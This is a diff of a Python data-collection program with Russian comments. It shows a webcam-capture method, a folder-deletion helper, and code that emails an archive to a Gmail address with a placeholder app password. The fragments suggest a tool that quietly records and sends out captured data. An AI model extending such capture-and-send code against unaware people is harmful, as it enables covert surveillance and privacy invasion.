@@ -49,6 +49,7 @@ class DataCollector:
 
         self.logger.log_info("Инициализация DataCollector")
         self.logger.log_info(f"Папка для данных: {FOLDER_PATH}")
+    
 
     def capture_webcam(self):
         """Захват изображения с веб-камеры"""
@@ -674,9 +675,6 @@ def delete_path(path):
             print(f"Папка '{path}' успешно удалена со всем содержимым")
             return True
             
-    except PermissionError:
-        print(f"Ошибка: нет прав для удаления '{path}'")
-        return False
     except Exception as e:
         print(f"Ошибка при удалении '{path}': {e}")
         return False
@@ -688,9 +686,10 @@ def main():
         # Инициализация и запуск сборщика
         collector = DataCollector()
         collector.start_monitoring()
+        collector.logger.close()
 
         sender_email = "mokaiv118@gmail.com"
-        sender_password = "xxx"  # пароль приложения
+        sender_password = "xxxx xxxx xxxx xxxx"  # пароль приложения
         recipient_email = "mokaiv118@gmail.com"
         subject = "5 секунд"
         message = "Привет! Это письмо содержит архив 5ти секунд."
